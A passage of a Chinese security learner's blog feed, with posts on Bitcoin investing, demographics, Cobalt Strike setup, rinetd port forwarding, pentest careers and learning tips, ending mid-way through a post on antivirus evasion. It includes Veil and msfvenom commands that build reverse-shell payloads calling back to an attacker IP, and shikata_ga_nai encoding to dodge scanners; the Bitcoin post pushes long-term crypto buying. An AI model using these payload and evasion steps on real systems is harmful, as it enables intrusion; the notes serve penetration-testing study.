    <content type="html"><![CDATA[<h1 id="比特币杂谈"><a href="#比特币杂谈" class="headerlink" title="比特币杂谈"></a>比特币杂谈</h1><p>参考资料：</p><ul><li><a href="http://open.163.com/newview/movie/free?pid=MC0Q7LQR3&mid=MC0Q97OP1">【TED】对未来产生影响最大的科技</a></li><li><a href="https://www.jinse.com/blockchain/452580.html">日本第一大互联网公司GMO：用比特币支付4700多名员工工资</a></li><li><a href="http://bjiebtc.com/shenme-bitebi/">《比特币入门宝典》之什么是比特币</a></li><li><a href="http://btc66.net/?p=1766">比特币价值全新叙事：比特币会淘汰所有其他货币</a></li><li><a href="https://github.com/GammaGao/bitcoinwhitepaper/blob/master/bitcoin_cn.pdf">白皮书中文版PDF</a></li><li><a href="https://www.bilibili.com/video/av67624819/?spm_id_from=trigger_reload">普通人如何在数字货币市场赚钱？老韭菜干货分享。</a></li><li><a href="https://zhuanlan.zhihu.com/p/67803602">怎么购买比特币？购买比特币详细步骤</a></li><li><a href="https://electrum.org/#download">比特币钱包/客户端</a></li><li><a href="http://bjiebtc.com/rumen-bitebi/">3步完成第一笔比特币投资</a></li><li>《精通比特币》书籍</li><li>《The Bitcoin Standard》币本位，现在此书无中文版</li></ul><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>其实我也不是比特币的狂热信徒。只是我明白，世界总处于变革之中。</p><p>当年莱特兄弟发明飞机，普通人听到消息，也是不屑一顾。哪里能想到飞机成为了新世纪最重要的交通工具之一呢？</p><p>….<br>莱特兄弟给父亲发去电报报喜，并让他“通知媒体”。然而代顿日报却拒绝刊登这则消息，理由是这次飞行时间太短，因而不够重要。而与两兄弟想法相反的是，一个电报员却在当时将消息泄露给一家弗吉尼亚州的报社，结果这家报社炮制出了一则极度失真的报道，而这则报道又被几家其他报纸转载，包括代顿的报纸。莱特兄弟在1月份向媒体发表了事实声明。尽管如此他们的飞行在当时没有激起公众的兴趣，人们甚至连两兄弟是谁都不知道。于是这则新闻很快淡出公众视野。<br>…<br>鲁特也给《<a href="https://zh.wikipedia.org/wiki/%E7%A7%91%E5%AD%A6%E7%BE%8E%E5%9B%BD%E4%BA%BA" title="科学美国人">科学美国人</a>》杂志寄去过一篇有关的稿子，不过该杂志的编辑对莱特兄弟的试飞抱有成见，所以没有刊登鲁特的文章。有鉴于此，在俄亥俄州以外的地方不仅没多少人知道莱特兄弟的成绩，相反还经常有人会质疑他们的工作。1906年的《<a href="https://zh.wikipedia.org/wiki/%E5%9B%BD%E9%99%85%E5%85%88%E9%A9%B1%E8%AE%BA%E5%9D%9B%E6%8A%A5" title="国际先驱论坛报">国际先驱论坛报</a>》在它的巴黎版上就刊登了一篇有关莱特兄弟兄弟的文章，标题劈头盖脸地写道：“是飞人还是骗子？（FLYERS OR LIARS?）”</p><p>代顿的本地报纸在多年以后只要一提到莱特兄弟的时候都会自豪地说本市出了个国民英雄，可想当年这两位国民英雄在他们家门口创造历史的时候，这些报社的记者们对他们不屑一顾，以至于错失了见证历史的良机。<br>…<br>1906年，欧洲航空协会的人在各大出版社铺天盖地地发表文章对莱特兄弟进行质疑。一些欧洲的报纸，特别是法国的报纸尤其露骨，公开地说他们是在“哗众取宠”（bluffeurs）<a href="https://zh.wikipedia.org/wiki/%E8%8E%B1%E7%89%B9%E5%85%84%E5%BC%9F#cite_note-WriB-61">[61]</a>。<br>…</p><p>人云亦云很容易，但研究调查阅读思考，并得出自己的结论并不容易。</p><p>我们都是普通人，做出的抉择无论正确还是错误，时间会验证一切！</p><h2 id="场内与场外交易区别"><a href="#场内与场外交易区别" class="headerlink" title="场内与场外交易区别"></a>场内与场外交易区别</h2><p>场内，币币交易，通过交易所。<br>场外，法币交易，个人交易。类似于“淘宝”，不过场外交易的不是商品，而是虚拟加密货币。一些人通过加密货币换取法币，另一些人通过法币换取加密货币。</p><p>当你没有比特币的时候，只能通过场外交易，通过法币换取虚拟加密货币。当你拥有虚拟加密货币了，就可以进行场内交易了。</p><h2 id="什么是场内交易？"><a href="#什么是场内交易？" class="headerlink" title="什么是场内交易？"></a>什么是场内交易？</h2><p>在交易平台上进行撮合，买卖价格公开，平台实时显示当前的报价，这个就叫做场内交易。</p><p>比如说你想买1枚比特币，你看到当前的报价是10000元，这个时候你觉得有点高，你想在9900元时买入。</p><p>你就可以直接挂一个9900元的购买订单，如果有人以这个价格卖出，那么你这笔购买订单就交易成功了。</p><p>这个时候你就获得1枚比特币到你的账户了。</p><h2 id="场内交易优缺点"><a href="#场内交易优缺点" class="headerlink" title="场内交易优缺点"></a>场内交易优缺点</h2><ol><li> 不用保持在线完成交易，只需要设定好价格委托交易所完成交易。</li><li> 不需要找具体买（卖）家，平台自动帮你匹配。</li><li> 可以设定期望成交的价格，限价交易（什么是限价交易？）</li></ol><p>缺点：</p><ol><li> 国内的场内交易全是币币交易，无法通过人民币直接购买。</li></ol><h2 id="什么是场外交易？"><a href="#什么是场外交易？" class="headerlink" title="什么是场外交易？"></a>什么是场外交易？</h2><p>除了在交易平台之外的交易，统称为场外交易市场，又叫做OTC交易市场</p><p>在交易平台之外还有一些其他的地方可以进行交易，这些市场没有集中的和统一的交易制度和撮合机制。</p><p>假设你想买1枚比特币。有两种方式：</p><ol><li> 直接选择当前售价最便宜的卖家，一对一直接交易（尽量挑选交易量大并且信誉良好的卖家）。</li><li> 可以直接发布广告，在广告中填入你想要购买的价格，当有卖家愿意接受你的价格时，卖家会在平台联系你并完成交易。</li></ol><h2 id="场外交易的优缺点"><a href="#场外交易的优缺点" class="headerlink" title="场外交易的优缺点"></a>场外交易的优缺点</h2><p>优点：</p><ol><li> 可以在平台上汇总交易需求，方便大家交易</li><li> 对买卖双方进行身份验证，更加安全</li><li> 出现纠纷时，平台可以出面解决</li></ol><p>缺点：</p><ol><li> 交易过程需要双方同时在线操作（支付和放币）</li><li> 有可能产生纠纷（PS银行转账截图、收到款不放币等）</li></ol><h2 id="政府打击虚拟货币"><a href="#政府打击虚拟货币" class="headerlink" title="政府打击虚拟货币"></a>政府打击虚拟货币</h2><p>10月10日，支付宝安全中心在微博上发布一条动态，重申了对虚拟货币场外交易的态度：禁止将支付宝用于虚拟币交易，若发现交易涉及比特币或其他虚拟货币交易，支付宝会立即停止相关支付服务。</p><p>但是币安平台上仍然支持支付宝购买比特币，通过买家通过支付宝转账给卖家，卖家将比特币打入买家账户，这种操作，即可完成。</p><p>支付宝官方很难认定一笔交易到底是正常的转账，还是虚拟货币交易——除非在转账的备注上写明了比特币交易。</p><p>政府打击虚拟货币会怎样呢？虚拟货币会因此一文不值吗。</p><p>我们假设有一个架空的世界，那个世界的政府禁止私人持有黄金，只能使用政府不断超发的法币。那么黄金会因此一文不值吗？</p><h2 id="比特币如果有价值，任何人都可以创造出其他加密货币"><a href="#比特币如果有价值，任何人都可以创造出其他加密货币" class="headerlink" title="比特币如果有价值，任何人都可以创造出其他加密货币"></a>比特币如果有价值，任何人都可以创造出其他加密货币</h2><p>和腾讯的微信和QQ一样，最先出来的产品最终会垄断绝大多数的市场。不是说比特币有价值，那么其他人仿造这个开源的区块链网络就会有着同样的价值。</p><p>现在开发社交软件去跟微信和QQ竞争不是自寻死路吗？别人凭什么要放弃已有的熟悉的软件不用，转而去使用后来者开发的产品呢？</p><p>比特币是有价值的，而跟风的一些奇奇怪怪甚至是中心化的虚拟币则是诈骗。</p><p>比特币是一项史无前例的发明，它的应用范围现在还比较小，但等市场成熟以后，必定能够成为一种便利快捷并且保值的支付手段。</p><p>比特币就跟飞机一样——飞机一开始发明出来只能在空中飞十几秒，但是随着时间的发展，它会越来越好的。</p><h2 id="投资比特币要以数十年为期限"><a href="#投资比特币要以数十年为期限" class="headerlink" title="投资比特币要以数十年为期限"></a>投资比特币要以数十年为期限</h2><p>不要跟风投机，高买低卖。<br>每个月存一点点钱购买比特币作为养老金储蓄。三十年后，时间会给你答案。</p><p>最后，用李笑来老师的话作为本文的结束语</p><p>“赚钱的方法很多很多，每个人都应该、并且只应该用自己了解的方式赚钱”</p>]]></content>
    
    
    <categories>
      
      <category>View</category>
      
    </categories>
    
    
    <tags>
      
      <tag>View</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>大国空巢读后感</title>
    <link href="/2020/03/11/02-x/"/>
    <url>/2020/03/11/02-x/</url>
    
    <content type="html"><![CDATA[<p>这是一篇关于《大国空巢》的读后感。</p><p>人口问题是一个短期影响不大，长期影响深远的问题。</p><p>假设一对夫妻只生育一个小孩，20年为1代。</p><figure class="highlight subunit"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs subunit">8人：1<span class="hljs-string">+1</span>               1<span class="hljs-string">+1</span>                 1<span class="hljs-string">+1</span>               1<span class="hljs-string">+1</span> <br>                                                         花费20年<br>4人： 1     +           1                   1      +          1<br>花费20年<br>2人：        1                  +                  1<br>花费20年<br>1人：                           1<br></code></pre></div></td></tr></table></figure><p>60年时间，新增人口变为八分之一的人口。如果实行严格的计划生育1胎制，14亿人，60年后新增人口为1.75亿人。</p><p>我想，五险一金想必是空头支票吧。没有人口，什么经济增长、什么税收，没有可以工作的年轻人，都是空谈。</p><p>假设失去了工作能力的健康老人，平时花钱只用来买吃的喝的。现在一个月花费1000应该够了。30年就是36万。</p><p>算上通货膨胀率每年%8 （假设十年平均通胀率是8%）</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-11-02/3.PNG" alt="3"></p><p>现在一年需要花费1.2万，30年以后，就需要12.08万才能买到同样的东西。</p><p>那现在的36万的养老钱，30年后就需要362.26万才能达到相同的购买力，真是惊呆了。</p><h2 id="人口结构"><a href="#人口结构" class="headerlink" title="人口结构"></a>人口结构</h2><p>是人口结构问题，不是人口数量问题。有些人认为，中国人太多了，全国约14亿人，占世界总人口的19%</p><p>但是问题在于不健康的人口结构。如果社会上全是不事生产的老年人，那么钱就会变成废纸一般。财富需要劳动去生产，没有足够的劳动人口，有钱也买不到优质的产品和服务。</p><p>并且对于年轻人来说，交税去供养庞大的老年人口，那么更加不愿意生育更多小孩（没钱）。一旦进入老龄化社会，生育率会更加滑坡。</p><h2 id="去国企是万能的解药吗？"><a href="#去国企是万能的解药吗？" class="headerlink" title="去国企是万能的解药吗？"></a>去国企是万能的解药吗？</h2><p>参见90年代国企下岗。当不交税的国企人员越来越多，交税的韭菜越来越少，高层真的不会甩锅吗？</p><p>国企真的代表稳定吗？四五十岁的人可以这么想，因为他们还有十几二十年就要退休了。但是二十多岁的年轻人不能这么想。如果某一天不幸离开了国企，你又有什么技能能够让你保持生活水平不下降呢？</p><h2 id="需要做的准备"><a href="#需要做的准备" class="headerlink" title="需要做的准备"></a>需要做的准备</h2><p>“肉食者鄙，未能远谋”</p><p>2020年当权者还在执行计划生育政策，不肯将生育的权利还给群众。而普通群众，刚毕业的大学生22岁、23岁的年纪，不啃老，能养活自己已经算不错的了，靠自己结婚生子想都不敢想。<a href="https://www.zhihu.com/question/275460198/answer/973689463">某案例</a></p><p>就算结婚了的家庭，个个都生二胎，广大的单身群众会将生育率继续拖到1.0以下，被剥削的人远远大于剥削的人，对生育率于事无补。</p><p>中产逐渐消亡，只剩下底层和顶层。所谓的顶层要么拍拍屁股移民出去，“我死<del>移民</del>后，哪管他洪水滔天？”，要么引进移民来缓解老龄化社会的劳动力严重缺乏。</p><p>暂时能做到的准备是</p><ul><li> 存钱。能不花钱的地方就不花钱。经济危机、持久的经济衰退、老龄化，都在未来等着我们。</li><li> 练好英语/学习一门外语。对国内不满意也可以去发达国家发展。这是一个退路。</li><li> 保持学习，逐步提高在全国甚至是全球的劳动市场的竞争力。不要呆在舒适圈中，成天乐呵呵的用短视频、游戏等娱乐麻醉自己，不过是逃避现实。</li><li>学习理财。前面说了”那现在的36万的养老钱，30年后就需要362.26万才能达到相同的购买力”。学一点经济学和理财知识。比如说支付宝余额宝比银行活期利息要高；而支付宝上其他货币基金又比余额宝的利息要高…… 这种知识只要动动手指点击手机，利息就多了，有何乐而不为呢？有些人会说，利息又没有多少钱，但是通货膨胀看起来也没有多少钱，但是30年以后钱的购买力就少了很多。</li><li>不要买股票，A股，zf是庄家。A股是zf控股，割散户韭菜的。</li><li>定投大盘指数基金，不为别的，指数基金很稳，可以有着平均的投资收益。</li><li>定投比特币。比特币是对抗zf滥发法币（法定货币）的技术力量。比特币有无法伪造、总量恒定不会通胀、匿名性、去中心化设计十分安全（除非51%攻击）。如果所有人都用同一种加密货币，那么法币将失去滥印钞票，剥削持有钞票的每一个人的力量。</li></ul>]]></content>
    
    
    <categories>
      
      <category>View</category>
      
    </categories>
    
    
    <tags>
      
      <tag>View</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cobalt Strike （二）</title>
    <link href="/2020/03/06/02-x/"/>
    <url>/2020/03/06/02-x/</url>
    
    <content type="html"><![CDATA[<p>参考资料：</p><ul><li><a href="https://www.youtube.com/watch?v=5gwEMocFkc0&list=PL9HO6M_MU2nfQ4kHSCzAQMqxQxH47d1no&index=2">youtube官方视频</a></li><li><a href="https://xz.aliyun.com/t/3975#toc-5">渗透利器Cobalt Strike - 第1篇 功能及使用</a></li><li><a href="https://www.youtube.com/watch?v=J3BEeIx6Xzk">SMB Beacon Setup and Use</a></li><li><a href="http://blog.leanote.com/post/snowming/62ec1132a2c9">Cobalt Strike 4.0 官方教程 —— 第一章：操作</a></li><li><a href="https://www.youtube.com/watch?v=4xnBn5ZVkKE&feature=youtu.be">外部监听器与session转发</a></li></ul><p>我录制了关于 Cobalt Strike的使用视频，请移步观看：</p><ul><li><p><a href="https://www.acfun.cn/v/ac13359342">1. Cobalt Strike介绍以及安装</a></p></li><li><p><a href="https://www.acfun.cn/v/ac13368508">2. Cobalt Strike客户端用户面板</a></p></li></ul><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata">视频内容目录<br>1.  Cobalt Strike介绍以及安装<br>系统要求<br>试用版和完整版的区别<br>更新<span class="hljs-keyword">cs</span>产品密钥<br><span class="hljs-keyword">cs</span>服务端<br><span class="hljs-keyword">cs</span>客户端<br><span class="hljs-keyword">cs</span>脚本<br>2. Cobalt Strike客户端用户面板<br>工具栏<br>session可视化: target栏，session栏，pivot可视化<br><span class="hljs-keyword">tab</span>按钮<br><span class="hljs-keyword">cs</span>快捷键栏目<br>控制面板consoles<br></code></pre></div></td></tr></table></figure><h2 id="oracle官网下载java环境"><a href="#oracle官网下载java环境" class="headerlink" title="oracle官网下载java环境"></a>oracle官网下载java环境</h2><p>oracle java se development kit 8u191</p><p><a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></p><h2 id="linux安装cs要求的java版本"><a href="#linux安装cs要求的java版本" class="headerlink" title="linux安装cs要求的java版本"></a>linux安装cs要求的java版本</h2><p>vi ~/.bashrc</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs linux配置java环境">#JAVA<br>export JAVA_HOME=/root/Desktop/jdk1.8.0_191<br>export JRE_HOME=$JAVA_HOME/jre<br>export PATH=$JAVA_HOME/bin:$JRE_HOME/bin:$PATH<br>export CLASSPATH=$JAVA_HOME/lib:$JRE_HOME/lib:.<br></code></pre></div></td></tr></table></figure><p>source ~/.bashrc</p><h2 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h2><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">veil</span>  -t Evasion --ordnance-payload rev_http -p <span class="hljs-number">41</span> --ip <span class="hljs-number">3.12.45.22</span> --port <span class="hljs-number">7788</span> -o chris<br></code></pre></div></td></tr></table></figure><p>payload x86 &amp; x64<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/03-06-02/1.PNG" alt="1"></p>]]></content>
    
    
    <categories>
      
      <category>cobaltstrike</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cobaltstrike</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>rinetd端口转发</title>
    <link href="/2020/02/29/10-x/"/>
    <url>/2020/02/29/10-x/</url>
    
    <content type="html"><![CDATA[<h1 id="rinetd端口转发"><a href="#rinetd端口转发" class="headerlink" title="rinetd端口转发"></a>rinetd端口转发</h1><p>参考资料：<a href="https://github.com/boutell/rinetd">https://github.com/boutell/rinetd</a><br>上一篇：<a href="https://whale3070.github.io/oscp/2019/12/25/07-x/">ssh端口转发</a></p><p>端口转发工具rinetd，和ssh端口转发不同。ssh本地端口转发和远程端口转发是单台主机对单台主机，两台主机之间不能直接连接的时候，使用ssh协议、通过vps代理做数据转发。</p><p>而rinetd很适合用在这种情况，公网IP只有一个，而内网中有许多主机共用这一个公网IP。我们拥有其中一台内网主机，想要在该主机开放4444端口，并且在公网ip上只开放80端口。当有请求访问公网ip的80端口，那么就转发到该主机4444端口。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-29-10/1.png" alt="1"></p><p>这种情况跟<a href="https://whale3070.github.io/oscp/2019/12/25/07-x/">ssh端口转发</a>中的动态端口转发有点像，但是不同的是，ssh动态端口转发是确定的，某台外网机器A配置好后，通过内网的某台机器B做代理，访问内网其他的主机C、D、E；而rinetd端口转发是不确定的，不知道哪个主机会连接到公网IP，外网也只能访问配置好的内网主机，不能访问内网其他主机。它们各有各自的用途，要结合情况来选择使用。</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">apt-get install rinetd<br>vi <span class="hljs-regexp">/etc/</span>rinetd.conf<br><br><span class="hljs-comment"># bindadress bindport connectaddress connectport</span><br><span class="hljs-number">206.125</span>.<span class="hljs-number">69.81</span> <span class="hljs-number">80</span> <span class="hljs-number">10.1</span>.<span class="hljs-number">1.2</span> <span class="hljs-number">80</span><br><span class="hljs-regexp">//</span>访问<span class="hljs-number">206.125</span>.<span class="hljs-number">69.81</span>:<span class="hljs-number">80</span>的连接，重定向至地址<span class="hljs-number">10.1</span>.<span class="hljs-number">1.2</span>的端口<span class="hljs-number">80</span>，该端口通常是防火墙内部的一台机器，没有直接通往外界的路线。<br><br><span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>      <span class="hljs-number">8080</span>     外网IP          <span class="hljs-number">8080</span><br><span class="hljs-regexp">//</span>该主机上所有连接到<span class="hljs-number">8080</span>端口的IP，都将重定向至外网IP的<span class="hljs-number">8080</span>端口<br><br>allow <span class="hljs-number">206.125</span>.<span class="hljs-number">69</span>.*<br><span class="hljs-regexp">//</span>运行IP是<span class="hljs-number">206.125</span>.<span class="hljs-number">69</span>.*的数据包<br><br>deny <span class="hljs-number">206.125</span>.<span class="hljs-number">69</span>.*<br><span class="hljs-regexp">//</span>拒绝IP是<span class="hljs-number">206.125</span>.<span class="hljs-number">69</span>.*的数据包<br><br>---<br>pkill rinetd  <span class="hljs-comment">##关闭进程</span><br>cat  <span class="hljs-regexp">/etc/</span>rinetd.conf<br>rinetd -c <span class="hljs-regexp">/etc/</span>rinetd.conf  <span class="hljs-comment">##启动转发</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>tools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>owasp渗透测试指南读后感</title>
    <link href="/2020/02/28/10-x/"/>
    <url>/2020/02/28/10-x/</url>
    
    <content type="html"><![CDATA[<p><strong>在看owasp渗透测试指南(2014)时，有了一些思考，于是写了这篇文章。</strong></p><blockquote><p>许多安全从业人员对安全测试的认识仍然停留在渗透测试的范围内。正如之前讨论，渗透测试虽然发挥了一定的作用,但它的作用不足以发现所有的漏洞，同时它过分依赖测试者的技巧。</p></blockquote><p>渗透测试只能当做是一种执行技术或者是用来提高对产生问题的意识。要改善应用程序的安全,必须提高软件的安全质量。</p><p>看到了书中这么说，我也有很多的想法。</p><p>上一次在安洵信息面试渗透测试实习，面试官（简称w）让我学习到了很多。</p><p>w和我交流了关于渗透技巧方面的东西。</p><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata">比如说apache服务器的配置，在<span class="hljs-keyword">conf</span>文件中，语句是这样是什么意思。答案是，是留后门的一种方式，可以将图片解析为脚本，作为图片木马获得webshell。<br><br>比如说，linux一些命令，清日志、查看在线的用户、ssh转发之类的。<br></code></pre></div></td></tr></table></figure><p>对我的建议，渗透测试要多实战；写的工具，需要帮助实战，如果工具能做到的，手工也能做到，那就没有任何意义。要么工具是为了提高手工的效率，要么是为了达到手工做不到的事。</p><p>于是我有了这种感觉。<strong>渗透技术高深者，往往掌握了很多漏洞的利用技巧，但每年都有新的软件问世，人不能终日follow所有的漏洞</strong>，于是我迷茫了。</p><p>w的说法是，只能尽力的学。从他的语气中，我感受到了一种无力感。漏洞利用再多，再熟练，那也只能用别人的工具，别人写好的exploit。w也自称脚本小子。</p><h2 id="实战派黑客"><a href="#实战派黑客" class="headerlink" title="实战派黑客"></a>实战派黑客</h2><p>黑帽子，白帽子。</p><p>对漏洞的处理方式不同，造成了两大阵营。<br>黑帽子将利用漏洞，放勒索软件、木马；白帽子帮助企业提高安全性。</p><p>与网络安全学院的同学交流后，我发现学院派有一个重视理论的倾向。比如说研究下密码学，计算机数学理论。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-28-09/1.PNG" alt="1"></p><p>学安全技术，有些人的目的，可能是拿到本科、研究生的文凭。</p><p>有些人的目的，可能是获取企业机密信息，比如泄露的开房数据，去卖钱。</p><p>有些人的目的，比如说我，作为一个信息安全专家，为了提高企业的安全性。</p><p>最近请教了前辈，一些学习方向之类的问题以及经验。2018.11.07.记录一下</p><p>以下是总结：</p><figure class="highlight markdown"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs markdown">1.黑产关注的是业务安全（非传统安全），门槛低+易变现。<br>高深的漏洞，需求在于国家、比特币等特殊行业<br><span class="hljs-bullet">2.</span> 安全企业，斗象科技、创宇——互联网乙方。<br>   互联网公司——美团、bat、滴滴等等<br>3.研究乌云案例。<br>4.安全问题是程序员的意识不足。需要加强代码能力，能够挖的漏洞越深，编程水平越厉害。<br>5.乙方渗透岗位，工作内容。挖漏洞，代码审计（乌云的套路）。<br>技术深度，甲方乙方实验室&gt;甲方互联网行业安全部门&gt;乙方互联网行业安全部门&gt;传统安全服务部门&gt;传统企业安全部门。<br>6.巡风poc，一个扫描器。github搜索xunfeng。<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>experience</category>
      
    </categories>
    
    
    <tags>
      
      <tag>experience</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记TK教主教导的学习方法</title>
    <link href="/2020/02/28/12-%E8%AE%B0TK%E6%95%99%E4%B8%BB%E6%95%99%E5%AF%BC%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%96%B9%E6%B3%95/"/>
    <url>/2020/02/28/12-%E8%AE%B0TK%E6%95%99%E4%B8%BB%E6%95%99%E5%AF%BC%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>今天TK教主给我们授课，其中讲的技术研究和个人成长方法我觉得很好，整理一下，以后没事看一看，我想能够激励我的成长吧。。。</p><ol><li>确立个人方向，结合工作内容，找出对应短板</li></ol><p>该领域主要专家们的工作是否都了解？</p><p>相关网络协议、文件格式是否熟悉？</p><p>相关的技术和主要工具是否看过，用过？</p><ol start="2"><li>阅读知识学习过程的起点，不能止于阅读</li></ol><p>工具的每个参数每个菜单都要看、要试</p><p>学习网络协议要实际抓包分析，学习文件格式要读代码实现</p><p>学习老漏洞一定要调试，搞懂别人代码每一个字节的意义，之后要完全重写一个Exploit</p><p>细节、细节、细节、刨根问底</p><ol start="3"><li>短期参考什么？比自己优秀的同龄人</li></ol><p>阅读他们的文章和其他工作成果，从细节中观察他们的学习方式和工作方式<br>4. 中期参考什么？你的方向上的业内专家<br>了解他们呢的成长轨迹，跟踪他们关注的内容<br>5. 长期参考什么？业内老牌企业和先锋企业</p><p>把握行业发展，技术趋势，为未来做积累</p><ol start="6"><li>以工具为线索</li></ol><p>一个比较省事的学习目录：Kali Linux</p><p>学习思路，以Metasploit为例：</p><p>遍历每个子目录，除了exploit里面还有什么？</p><p>每个工具分别有什么功能？原理是什么？涉及哪些知识？</p><p>能否进行优化？能否发展、组合出新功能</p><ol start="7"><li>以专家为线索</li></ol><p>你的技术方向里有哪些专家？</p><p>他们的邮箱、主页、社交网络帐号是什么？</p><p>他们在该方向上有哪些作品？发表过哪些演讲？</p><p>跟踪关注，一个一个学</p><ol start="8"><li>想提高某项技能，怎么切入？</li></ol><p>观察同龄人中做到这一点的人，看他们是怎么做的</p><p>比较自己和对方在各方面的差异，看哪些可以借鉴，哪些需要用新办法，扬长避短</p><p>试着做一段时间</p><p>回顾过程和结果，寻找需要改进的地方</p><p>例如：怎么提高文档水平？</p><p>收集优秀的文档，观察别人是怎么写的</p><p>分析自己之前的文档，对比和别人的差异，看哪些需要加强</p><p>多找机会写文档哪个</p><p>对比自己的新旧文档，看哪些地方有进步，哪些需要改进</p><ol start="9"><li><p>做好预研，收集相关前人成果，避免无谓的重复劳动</p></li><li><p>在可行性判断阶段，能找到工具就不写代码，能用脚本语言就不要用编译语言，把完美注意放在最终实现阶段</p></li><li><p>做好笔记并定期整理，遗忘会让所有的投入都白白浪费</p></li><li><p>多交流，别人说一个工具的名字可能让你节约数小时</p></li><li><p>咖啡可以提高思维效率，并且合法</p></li><li><p>无论怎么提高效率，想要成为专家，都要大量的时间投入</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>backup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>backup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Payload免杀</title>
    <link href="/2020/02/26/11-Payload%E5%85%8D%E6%9D%80/"/>
    <url>/2020/02/26/11-Payload%E5%85%8D%E6%9D%80/</url>
    
    <content type="html"><![CDATA[<p>首先放两个在线杀毒检测的站点。</p><ul><li><a href="https://www.virustotal.com/gui/home/upload">https://www.virustotal.com/gui/home/upload</a></li><li><a href="https://www.virscan.org/">https://www.virscan.org/</a></li></ul><p>上一篇<a href="https://whale3070.github.io/tools/2019/03/01/x/">msfvenom-生成攻击载荷</a>，我们已经学习了如何生成payload。现在看看如何防止被杀软杀掉生成的payload。</p><h2 id="使用msf对payload进行编码"><a href="#使用msf对payload进行编码" class="headerlink" title="使用msf对payload进行编码"></a>使用msf对payload进行编码</h2><h3 id="不使用任何编码"><a href="#不使用任何编码" class="headerlink" title="不使用任何编码"></a>不使用任何编码</h3><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">msfvenom -p windows/shell_reverse_tcp <span class="hljs-attribute">LHOST</span>=kali&#x27;sIP <span class="hljs-attribute">LPORT</span>=1234 -f exe -o payload.exe<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-26-11/1.PNG" alt="1"><br>virscan 49款杀软有28款报告是恶意文件。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-26-11/2.PNG" alt="2"><br>virustotal 68款有55款报告是恶意文件。</p><p>可以看出virustotal从检出率来看更胜一筹。</p><h3 id="使用编码模块shikata-ga-nai"><a href="#使用编码模块shikata-ga-nai" class="headerlink" title="使用编码模块shikata_ga_nai"></a>使用编码模块shikata_ga_nai</h3><figure class="highlight asciidoc"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs 